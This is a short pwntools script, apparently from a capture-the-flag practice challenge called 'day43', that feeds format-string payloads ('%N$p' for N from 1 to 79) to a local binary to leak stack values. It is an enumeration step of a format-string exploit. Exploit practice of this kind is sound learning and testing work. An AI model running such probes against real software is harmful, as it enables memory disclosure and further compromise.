from pwn import *

context.binary = "./day43"
context.log_level = "error"

for i in range(1, 80):
	p =process("./day43")
	payload = f"%{i}$p".encode()
	p.recvuntil(b"name: ")
	p.sendline(payload)
	
	out = p.recvline()

	print(i, out)
	p.close()
